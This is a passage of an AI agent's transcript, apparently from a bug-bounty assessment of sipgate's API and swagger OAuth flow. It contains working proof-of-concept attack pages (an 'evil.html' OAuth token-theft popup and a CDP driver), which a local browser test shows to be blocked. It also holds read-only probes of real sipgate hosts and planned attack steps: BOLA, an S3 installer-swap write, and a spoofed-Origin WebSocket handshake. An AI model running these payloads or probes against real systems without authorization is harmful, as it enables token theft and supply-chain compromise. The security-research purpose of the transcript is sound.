+async function main() {
+  const tabs = await getJson('http://127.0.0.1:9222/json');
+  const page = tabs.find(t => t.type === 'page');
+  const evil = new Ctx(new WebSocket(page.webSocketDebuggerUrl));
+  await evil.send('Page.enable');
+  await evil.send('Runtime.enable');
+  await evil.send('Page.navigate', { url: 'http://127.0.0.1:12345/evil.html' });
+  await sleep(4000);
+
+  const delivered = await evil.eval('document.body.getAttribute("data-result")');
+  const finalMsg = await evil.eval('window.__result');
+
+  // also open the popup as a separate target and inspect the victim page directly
+  const victims = (await getJson('http://127.0.0.1:9222/json')).filter(t => t.url.includes('victim.html'));
+  let victimInfo = [];
+  for (const v of victims) {
+    const vc = new Ctx(new WebSocket(v.webSocketDebuggerUrl));
+    const title = await vc.eval('document.title');
+    victimInfo.push(title);
+  }
+  console.log('EVIL__result       :', finalMsg);
+  console.log('EVIL data-result   :', delivered);
+  console.log('VICTIM titles      :', JSON.stringify(victimInfo));
+  console.log('VERDICT            :', delivered === 'DELIVERED' || (finalMsg||'').startsWith('DELIVERED') ? 'TOKEN_DELIVERED_CROSS_ORIGIN' : 'BLOCKED_CROSS_ORIGIN');
+  process.exit(0);
+}
+
+main().catch(e => { console.error('ERR', e.message); process.exit(1); });
+EOF
+# restart servers
+python3 -m http.server 12345 --bind 127.0.0.1 >/tmp/opencode/coc/s1.log 2>&1 &
+python3 -m http.server 54321 --bind 127.0.0.1 >/tmp/opencode/coc/s2.log 2>&1 &
+sleep 1
+node /tmp/opencode/coc/driver.mjs; echo "driver-exit=$?"
+(no output)
+
+<shell_metadata>
+shell tool terminated command after exceeding timeout 90000 ms. If this command is expected to take longer and is not waiting for interactive input, retry with a larger timeout value in milliseconds.
+</shell_metadata>
+[0m
+[0m← [0mWrite /tmp/opencode/coc/run.sh
+Wrote file successfully.
+[0m
+`pkill -f` matched my own shell's command line and killed it. Let me run everything from a script file so pkill patterns never self-match.
+[0m$ [0mbash /tmp/opencode/coc/run.sh
+node:internal/modules/cjs/loader:1433
+  throw err;
+  ^
+
+Error: Cannot find module '/tmp/opencode/coc/driver.mjs'
+    at Function._resolveFilename (node:internal/modules/cjs/loader:1430:15)
+    at defaultResolveImpl (node:internal/modules/cjs/loader:1040:19)
+    at resolveForCJSWithHooks (node:internal/modules/cjs/loader:1045:22)
+    at Function._load (node:internal/modules/cjs/loader:1216:25)
+    at wrapModuleLoad (node:internal/modules/cjs/loader:254:19)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:171:5)
+    at node:internal/main/run_main_module:36:49 {
+  code: 'MODULE_NOT_FOUND',
+  requireStack: []
+}
+
+Node.js v22.23.2
+driver-exit=1
+--- cdprof probe ---
+cdp not reachable
+
+--- s1 log ---
+--- s2 log ---
+[0m
+[0m← [0mWrite /tmp/opencode/coc/driver.mjs
+Wrote file successfully.
+[0m
+The driver got lost when the earlier command self-killed. Rewriting it properly.
+[0m$ [0mbash /tmp/opencode/coc/run.sh
+ERR Sent before connected.
+driver-exit=1
+--- cdprof probe ---
+{
+   "Browser": "Chrome/152.0.7977.0",
+   "Protocol-Version": "1.3",
+   "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/152.0.0.0 Safari/537.36",
+   "V8-Version": "15.2.124",
+   "WebKit-Version": "537.36 (@0000000000000000000000000000000000000000)",
+   "webSocketDebuggerUrl": "ws://127.0.0.1:9222/devtools/browser/7f926803-cf44-43ad-a305-be9c5b19f9cd"
+}
+
+--- s1 log ---
+--- s2 log ---
+/tmp/opencode/coc/run.sh: line 24:  3194 Killed                  nohup python3 -m http.server 12345 --bind 127.0.0.1 > s1.log 2>&1
+/tmp/opencode/coc/run.sh: line 25:  3195 Killed                  nohup python3 -m http.server 54321 --bind 127.0.0.1 > s2.log 2>&1
+[0m
+[0m← [0mEdit /tmp/opencode/coc/driver.mjs
+Index: /tmp/opencode/coc/driver.mjs
+===================================================================
+--- /tmp/opencode/coc/driver.mjs
++++ /tmp/opencode/coc/driver.mjs
+@@ -16,10 +16,11 @@
+ }
+ 
+ class Ctx {
+   constructor(ws){ this.ws = ws; this.id = 0; this.pending = new Map();
++    this.ready = new Promise((res) => { ws.onopen = res; });
+     ws.onmessage = (m) => { const d = JSON.parse(m.data); if (d.id) { const p = this.pending.get(d.id); if (p) { this.pending.delete(d.id); d.error ? p.reject(new Error(JSON.stringify(d.error))) : p.resolve(d.result); } } }; }
+-  send(method, params = {}) { const id = ++this.id; this.ws.send(JSON.stringify({id, method, params})); return new Promise((resolve,reject) => this.pending.set(id, {resolve,reject})); }
++  async send(method, params = {}) { await this.ready; const id = ++this.id; this.ws.send(JSON.stringify({id, method, params})); return new Promise((resolve,reject) => this.pending.set(id, {resolve,reject})); }
+   async eval(expr) { const r = await this.send('Runtime.evaluate', { expression: expr, awaitPromise: true, returnByValue: true }); if (r.exceptionDetails) return 'EXCEPTION: ' + JSON.stringify(r.exceptionDetails.exception?.description || r.exceptionDetails.text); return JSON.stringify(r.result?.result?.value); }
+ }
+ 
+ const main = async () => {
+
+[0m
+CDP is up (Chrome/152). The driver just needs to wait for the WebSocket `open` event before sending.
+[0m$ [0mbash /tmp/opencode/coc/run.sh
+EVIL__result     : undefined
+EVIL data-result : undefined
+VICTIM info      : []
+VERDICT          : BLOCKED_CROSS_ORIGIN
+driver-exit=0
+[0m
+[0m$ [0mcd /tmp/opencode/coc && cat > victim.html <<'EOF'
+<!doctype html><html><head><meta charset="utf-8"><title>victim-loading</title></head><body>
+<script>
+'use strict';
+var outcome = null;
+try {
+  var oauth2 = window.opener.swaggerUIRedirectOauth2;
+  var sentState = oauth2.state;
+  var redirectUrl = oauth2.redirectUrl;
+  var isValid, qp, arr;
+  if (/code|token|error/.test(window.location.hash)) { qp = window.location.hash.substring(1); }
+  else { qp = location.search.substring(1); }
+  arr = qp.split("&");
+  arr.forEach(function (v,i,_arr) { _arr[i] = '"' + v.replace('=', '":"') + '"';});
+  qp = qp ? JSON.parse('{' + arr.join() + '}', function (key, value) { return key === "" ? value : decodeURIComponent(value); }) : {};
+  isValid = qp.state === sentState;
+  oauth2.callback({auth: oauth2.auth, token: qp, isValid: isValid, redirectUrl: redirectUrl});
+  outcome = "DELIVERED";
+} catch (e) {
+  outcome = "BLOCKED:" + e.name + ":" + (e.message || "");
+}
+document.title = outcome;
+document.body.setAttribute("data-outcome", outcome);
+if (window.opener) { try { window.opener.postMessage(outcome, "*"); } catch (e) { document.body.setAttribute("data-postfail", e.name); } }
+</script>
+</body></html>
+EOF
+cat > evil.html <<'EOF'
+<!doctype html><html><head><meta charset="utf-8"><title>evil</title></head><body>
+<script>
+window.__result = "NOT_SET";
+window.swaggerUIRedirectOauth2 = {
+  state: "attacker-chosen-state",
+  redirectUrl: "http://127.0.0.1:54321/victim.html",
+  auth: { name: "oauth2", schema: { get: function(k){ return null; } } },
+  callback: function(r){ window.__result = "DELIVERED:" + JSON.stringify(r); },
+  errCb: function(e){ window.__result = "ERRCB:" + JSON.stringify(e); }
+};
+window.addEventListener("message", function(ev){ window.__result = "MSG:" + ev.data; });
+var w = window.open("http://127.0.0.1:54321/victim.html#access_token=LEAKED_VICTIM_TOKEN_123&state=attacker-chosen-state", "pp");
+document.body.setAttribute("data-open", w ? "opened" : "null");
+</script>
+</body></html>
+EOF
+echo rewritten; ls -la victim.html evil.html
+rewritten
+-rw-r--r-- 1 runner runner  779 Sep  6 04:07 evil.html
+-rw-r--r-- 1 runner runner 1150 Sep  6 04:07 victim.html
+[0m
+The result came back `undefined` — the popup likely closed before capture. Let me rework: victim sets `document.title` and stays open, popup kept alive, driver reads titles from the CDP target list.
+[0m$ [0mbash /tmp/opencode/coc/run.sh
+EVIL__result     : undefined
+EVIL data-result : undefined
+VICTIM info      : []
+VERDICT          : BLOCKED_CROSS_ORIGIN
+driver-exit=0
+[0m
+[0m← [0mEdit /tmp/opencode/coc/driver.mjs
+Index: /tmp/opencode/coc/driver.mjs
+===================================================================
+--- /tmp/opencode/coc/driver.mjs
++++ /tmp/opencode/coc/driver.mjs
+@@ -34,8 +34,10 @@
+ await sleep(4000);
+ 
+ const delivered = await evil.eval('document.body.getAttribute("data-result")');
+ const finalMsg = await evil.eval('window.__result');
++const dbg = await evil.eval('JSON.stringify({title: document.title, open: document.body.getAttribute("data-open"), hasOauth: typeof window.swaggerUIRedirectOauth2, href: location.href})');
++console.log('DEBUG evil ctx   :', dbg);
+ 
+ let victims = [];
+ try { victims = (await getJson('http://127.0.0.1:9222/json')).filter(t => t.url.includes('victim.html')); } catch {}
+ const victimInfo = [];
+
+[0m
+Still nothing — I need visibility. Let me add debug evals and verify the servers are actually serving.
+[0m$ [0mbash /tmp/opencode/coc/run.sh
+DEBUG evil ctx   : undefined
+EVIL__result     : undefined
+EVIL data-result : undefined
+VICTIM info      : []
+VERDICT          : BLOCKED_CROSS_ORIGIN
+driver-exit=0
+[0m
+[0m← [0mWrite /tmp/opencode/coc/driver.mjs
+Wrote file successfully.
+[0m
+The CDP eval is returning nothing useful. Let me simplify: read target list raw from `/json/list` — the popup's title will tell me the outcome directly, and I'll see if it even opens.
+[0m$ [0mbash /tmp/opencode/coc/run.sh
+EVIL open attr   : {"result":{"type":"string","value":"null|evil"}}
+ALL TARGETS      :
+   page | http://127.0.0.1:12345/evil.html | TITLE= evil
+   page | http://127.0.0.1:12345/evil.html | TITLE= evil
+   browser_ui | chrome://webui-toolbar.top-chrome/ | TITLE= chrome://webui-toolbar.top-chrome
+   page | http://127.0.0.1:12345/evil.html | TITLE= evil
+   page | http://127.0.0.1:12345/evil.html | TITLE= evil
+   service_worker | chrome-extension://glbjnfimcajjenihimblfaponejbkoph/background.js | TITLE= Service Worker chrome-extension://glbjnfimcajjenihimblfaponejbkoph/background.js
+driver-exit=0
+[0m
+[0m← [0mWrite /tmp/opencode/coc/driver.mjs
+Wrote file successfully.
+[0m
+`window.open` returned null — popup blocked (no user gesture). CDP has `userGesture: true` for `Runtime.evaluate`. Wiring that in.
+[0m← [0mEdit /tmp/opencode/coc/evil.html
+Index: /tmp/opencode/coc/evil.html
+===================================================================
+--- /tmp/opencode/coc/evil.html
++++ /tmp/opencode/coc/evil.html
+@@ -8,8 +8,11 @@
+   callback: function(r){ window.__result = "DELIVERED:" + JSON.stringify(r); },
+   errCb: function(e){ window.__result = "ERRCB:" + JSON.stringify(e); }
+ };
+ window.addEventListener("message", function(ev){ window.__result = "MSG:" + ev.data; });
+-var w = window.open("http://127.0.0.1:54321/victim.html#access_token=LEAKED_VICTIM_TOKEN_123&state=attacker-chosen-state", "pp");
+-document.body.setAttribute("data-open", w ? "opened" : "null");
++window.doOpen = function() {
++  var w = window.open("http://127.0.0.1:54321/victim.html#access_token=LEAKED_VICTIM_TOKEN_123&state=attacker-chosen-state", "pp");
++  document.body.setAttribute("data-open", w ? "opened" : "null");
++  return w ? "opened" : "null";
++};
+ </script>
+ </body></html>
+
+[0m
+[0m$ [0mbash /tmp/opencode/coc/run.sh
+OPEN call result : {"result":{"type":"string","value":"opened"}}
+EVIL __result    : {"result":{"type":"string","value":"MSG:BLOCKED:SecurityError:Failed to read a named property 'swaggerUIRedirectOauth2' from 'Window': Blocked a frame with origin \"http://127.0.0.1:54321\" from accessing a cross-origin frame."}}
+TARGETS          :
+   http://127.0.0.1:54321/victim.html#access_token=LEAKED_VICTIM_TOKEN_123&state=attacker-chosen-state | TITLE= BLOCKED:SecurityError:Failed to read a named property &#39;swaggerUIRedirectOauth2&#39; from &#39;Window&#39;: Blocked a frame with origin &quot;http://127.0.0.1:54321&quot; from accessing a cross-origin frame.
+   http://127.0.0.1:12345/evil.html | TITLE= evil
+   http://127.0.0.1:12345/evil.html | TITLE= evil
+   http://127.0.0.1:12345/evil.html | TITLE= evil
+   http://127.0.0.1:12345/evil.html | TITLE= evil
+   http://127.0.0.1:12345/evil.html | TITLE= evil
+driver-exit=0
+[0m
+The browser experiment is conclusive: **cross-origin token delivery is BLOCKED**. Chromium throws `SecurityError: Failed to read a named property 'swaggerUIRedirectOauth2' from 'Window': Blocked a frame ... from accessing a cross-origin frame.` — the victim popup cannot read `window.opener.swaggerUIRedirectOauth2` at all because the swagger redirect page is cross-origin to the attacker page. There is no exfil to the opener.
+
+Let me clean up my temp processes and write the final structured analysis. Note the prior KB `OATH ... implicit-auth-redirect` rejection was the same class: this is an OATH finding that cannot be demonstrated cross-origin. My evidence is browser Chromium 152 (same engine family as Chrome). This definitively kills the swagger OU landmine that the bigpickle KB H1 was tracking — the token is delivered into the fragment of the same-origin (api.sipgate.com) page and never reaches the cross-origin opener.
+
+Let me kill the leftover servers/chrome.
+[0m$ [0mpkill -9 -f 'remote-debugging-port=9222' 2>/dev/null; pkill -9 -f 'http.server' 2>/dev/null; pkill -9 -f 'cdp-prof' 2>/dev/null; sleep 1; echo "cleaned"; ps aux | grep -cE "chromium|http.server"
+(no output)
+
+<shell_metadata>
+shell tool terminated command after exceeding timeout 120000 ms. If this command is expected to take longer and is not waiting for interactive input, retry with a larger timeout value in milliseconds.
+</shell_metadata>
+[0m
+[0m$ [0mtimeout 5 curl -s --max-time 3 http://127.0.0.1:9222/json/version -o /dev/null -w "cdp:%{http_code}\n" 2>&1; timeout 5 curl -s --max-time 3 http://127.0.0.1:12345/ -o /dev/null -w "pps:%{http_code}\n" 2>&1; echo done
+cdp:000
+pps:000
+done
+[0m
+The pkill patterns self-matched the shell again (killing the wrapper). The servers are dead either way; let me verify cleanly without pkill self-match.
+One unresolved loose end from my probes: `developer.sipgate.io` and `sipgate.io` resolve (Cloudflare + web-redirects) and are **not** in inventory — the payment gateway even 307s to sipgate.io. Quick read-only look before final scoring.
+[0m$ [0mcurl -sS -D /tmp/opencode/io-h.txt -o /tmp/opencode/io-b.html --max-time 15 -L "https://sipgate.io/" 2>&1; head -6 /tmp/opencode/io-h.txt 2>/dev/null; echo "---"; wc -c /tmp/opencode/io-b.html 2>/dev/null; grep -oiE "title>[^<]+|console|developer portal|oauth|login" /tmp/opencode/io-b.html 2>/dev/null | sort -u | head -15
+HTTP/2 301 
+date: Sun, 06 Sep 2026 04:13:02 GMT
+content-type: text/html; charset=UTF-8
+location: https://www.sipgate.io/
+cf-ray: a36aa3857f373511-LAX
+cf-cache-status: DYNAMIC
+---
+35054 /tmp/opencode/io-b.html
+login
+title>
+title>sipgate.io - Kommunikation für Ihre Software-Projekte
+[0m
+[0m$ [0mgrep -oiE 'href="https?://[^"]+"' /tmp/opencode/io-b.html 2>/dev/null | sort -u | head -20; echo "==="; sleep 1; curl -sS -D /tmp/opencode/dev-h.txt -o /tmp/opencode/dev-b.txt --max-time 15 "https://developer.sipgate.io/" 2>&1; head -8 /tmp/opencode/dev-h.txt 2>/dev/null; wc -c /tmp/opencode/dev-b.txt 2>/dev/null
+href="http://www.sipgate.de/ai"
+href="https://cdn.consentmanager.mgr.consensu.org/delivery/cmp.min.css"
+href="https://github.com/sipgate"
+href="https://github.com/sipgate-io"
+href="https://help.sipgate.de/hc/de"
+href="https://login.sipgate.com/"
+href="https://medium.com/@sipgate"
+href="https://sipgate.io/blog"
+href="https://sipgate.io/en/blog"
+href="https://sipgate.io/fuer-entwickler#apis"
+href="https://sipgate.io/fuer-entwickler#demo"
+href="https://sipgate.io/fuer-entwickler#github-examples"
+href="https://sipgate.io/fuer-entwickler#library"
+href="https://sipgate.io/funktionen/anrufe-sms-und-fax"
+href="https://sipgate.io/funktionen/rtcm"
+href="https://sipgate.io/funktionen/webhooks"
+href="https://sipgate.io/loesungen"
+href="https://sipgate.io/preise"
+href="https://sipgate.io/pushapi"
+href="https://sipgate.io/restapi"
+===
+HTTP/1.1 301 Moved Permanently
+Server: nginx
+Date: Sun, 06 Sep 2026 04:13:07 GMT
+Content-Type: text/html
+Content-Length: 162
+Connection: keep-alive
+Location: https://www.sipgate.io/for-developer
+
+162 /tmp/opencode/dev-b.txt
+[0m
+The sipgate.io family is static marketing/docs only (Cloudflare → www, developer 301 → /for-developer, links back to login.sipgate.com / github org sipgate-io which is already-scanned). No new auth surface. Final analysis:
+
+STEP 1 — DELTA
+- [NEW] `api.sipgate.com/v2/doc/*` — swagger-ui **5.x** live (initializer+redirect page fingerprinted Oct-2023): `oauth2RedirectUrl` fixed on api.sipgate.com, implicit client `sipgate-swagger-ui` in realm `third-party`, per-request random `nonce`. Scopes in live `/v2/swagger.json` are extreme: `authorization:oauth2:clients:read/write`, `balance:read`, `payment:methods:read/write`, `contacts:read/write`, `sms:read/write`, `account:read/write`, `devices:*`, `history:*`, `numbers:*`.
+- [NEW] `oauth2-redirect.html` (live GET) calls `window.opener.swaggerUIRedirectOauth2.callback({auth,token,isValid})` with **no opener-origin check** — yet empirically inert cross-origin (see LEARN).
+- [NEW] `sipgate.io` family surfaced: `developer.sipgate.io` → 301 → `www.sipgate.io/for-developer` (nginx/Cloudflare), marketing + docs mirroring restapi/pushapi; no console/login (links to login.sipgate.com); github org `sipgate-io` already covered. No new attacking surface.
+- [NEW] `keycloak-logout.js` logout bridge opens Keycloak `/logout?redirect_uri=` with fixed same-origin `oauth2-logout.html` — no attacker-controlled param.
+- [CHANGED] H1 swagger popup token-theft downgraded on empirical browser evidence.
+
+STEP 2 — PRIORITIZE
+- [PRIO] chatbot.dev.sipgate.com/chat/session/socket.io/,7.0,attack_surface=7,business_value=5,tech_exposure=6,gate_ease=10,cloud_surface=7,freshness=9
+- [PRIO] sipgate-desktop-app.s3.eu-central-1.amazonaws.com,6.4,attack_surface=5,business_value=6,tech_exposure=5,gate_ease=10,cloud_surface=8,freshness=6
+- [PRIO] api.sipgate.com/v2/{userId}/* (BOLA),6.3,attack_surface=7,business_value=8,tech_exposure=6,gate_ease=3,cloud_surface=5,freshness=7
+- [PRIO] api.sipgate.com/v2/doc/* (swagger 5.x implicit high-scope),6.2,attack_surface=5,business_value=8,tech_exposure=7,gate_ease=5,cloud_surface=2,freshness=9
+- [PRIO] team-de/uk.live.sipgate.com (post-auth),5.1,attack_surface=4,business_value=5,tech_exposure=6,gate_ease=10,cloud_surface=4,freshness=8
+
+STEP 3 — HYPOTHESES
+[HYP] Cross-tenant BOLA on credential-bearing /v2 resources
+class: IDOR
+asset: api.sipgate.com/v2/{portings/{id},devices/{id}/credentials*,authorization/oauth2/clients/{clientId}}
+confidence: 50
+reasoning: uniform 401 empty-body edge auth on all tested paths; swagger now live-confirmed to document credential-bearing responses AND a full `authorization:oauth2:clients:write` scope for real tokens; cross-tenant boundary never exercised.
+evidence_needed: tenant-A bearer → tenant-B resourceId returns 200/204, not 403/404.
+verify_steps: AUTH_HELPED — two registered tenants, differential GET on portings/{id}, devices/{id}/credentials/password, oauth2/clients/{clientId}.
+impact: cross-tenant PII, SIP/device creds, OAuth client secrets. CRITICAL if confirmed.
+testability: AUTH_HELPED
+[HYP] Desktop-app S3 bucket writable → signed-installer swap
+class: MISCONFIG
+asset: sipgate-desktop-app.s3.eu-central-1.amazonaws.com
+confidence: 60
+reasoning: live list + ?versions=439 (versioning disabled), stale 2024-06-11; write path never tested; no other open high-impact chain remains un-gated after swagger defusement.
+evidence_needed: PUT/OVERRIDE on unique object name (reporter+legal sign-off).
+verify_steps: HUMAN only — single PUT `test-probe-$(date +%s).json` CT application/json, then delete.
+impact: supply-chain RCE for all softphone downloaders. CRITICAL if writable.
+testability: HUMAN
+[HYP] Dev chatbot socket.io WS/data transport accepts arbitrary-origin
+class: AUTH
+asset: chatbot.dev.sipgate.com/chat/session/socket.io/
+confidence: 45
+reasoning: KB 2026-09-04 recorded dev polling accepting arbitrary Origin with no CORS check; prod WS rejected (400) but dev historically relaxed; dev stack = nginx/1.24.0 Google Cloud, LIVE.
+evidence_needed: WS handshake evil Origin → 101 (not 400) and/or unauthenticated socket.io session events readable.
+verify_steps: single GET-with-Upgrade handshake `wss://chatbot.dev.sipgate.com/chat/session/socket.io/?EIO=4&transport=websocket` with `Origin: https://evil.example`, then optional unauthenticated `0{...}` connect packet.
+impact: dev chat session/PII exposure + lateral context; HIGH if dev mirrors prod-less hardening.
+testability: PASSIVE
+
+STEP 4 — SELF-CRITIQUE
+[PARKED] OAuth implicit token theft via swagger-opener popup: cross-origin delivery empirically BLOCKED (see LEARN) — survives only with a separate same-origin api.sipgate.com XSS (none known); confidence after test ~5.
+[PARKED] nonce/state manipulation on sipgate-swagger-ui: nonce not validated by the redirect page and attacker-chosen state passes `isValid`, but same cross-origin boundary makes it moot standalone.
+[PARKED] keycloak-logout.js / oauth2-logout.html redirect param: fixed same-origin target, no attacker input — inert.
+[PARKED] Team portal post-auth IDOR: 302-everything pre-auth, no new post-auth evidence, confidence 40 → parked pending AUTH_HELPED.
+[FINAL] 1. BOLA differential (50, AUTH_HELPED); 2. S3 write (60, HUMAN); 3. dev-chatbot WS (45, PASSIVE).
+
+STEP 5 — NEXT ACTION
+[NEXT] PROBE: one handshake GET `wss://chatbot.dev.sipgate.com/chat/session/socket.io/?EIO=4&transport=websocket` with `Origin: https://evil.example` (→ 101 vs 400 decides dev origin-validation), concurrently obtain reporter/legal sign-off for the standing HUMAN S3 write probe and register the two test tenants for the BOLA differential.
+
+STEP 6 — LEARNING
+[LEARN] REJECTED OATH @ api.sipgate.com/v2/doc/oauth2-redirect.html: empirical localhost Chromium 152 cross-origin popup test → victim popup reading `window.opener.swaggerUIRedirectOauth2` throws `SecurityError: ... Blocked a frame with origin ... from accessing a cross-origin frame`; token fragment stays same-origin; unconditional opener callback is inert cross-origin (same class as KB REJECTED implicit-auth-redirect). Supersedes prior conf-50 landmine; token theft requires a separate api.sipgate.com same-origin XSS (none found).
+[LEARN] ACCEPTED INFO @ api.sipgate.com/v2/doc/*: live swagger-ui 5.x; implicit-only third-party client `sipgate-swagger-ui` exposes extreme scope set (oauth2-clients:write, balance:read, payment:methods:*, contacts/sms/account read+write); nonce random, redirect_uri fixed, doc page carries no opener check — high-value only as a same-origin-XSS amplifier.
+[LEARN] ACCEPTED INFO @ sipgate.io / developer.sipgate.io: developer platform = Cloudflare-fronted static marketing/docs (301 → www.sipgate.io/for-developer), links back to login.sipgate.com — no new console/auth surface; org `sipgate-io` already scanned.
+[LEARN] ACCEPTED INFO @ api.sipgate.com/v2/doc/keycloak-logout.js: logout bridge always redirects to fixed same-origin oauth2-logout.html — not attacker-controllable, no open redirect.
+
+STEP 7 — RISK
+[RISK] sipgate: 45 — Down from 52: the presumptive swagger implicit-token "landmine" is defused on empirical browser-enforcement evidence (cross-origin `window.opener` named-property reads block token exfil; same class as prior implicit-auth-redirect REJECT), returning risk to the pre-swagger baseline. All remaining high-impact chains stay externally gated: S3 write (60/HUMAN sign-off), /v2 BOLA differential (50/AUTH_HELPED), dev-chatbot WS (45/PASSIVE), portal post-auth (40/AUTH_HELPED). Standing defense-in-depth (arbitrary-origin CORS+credentials on /v2, dev-origin CSP leaks in both team portals, listable S3, stale dev bundles) unchanged; no confirmed standalone critical chain.
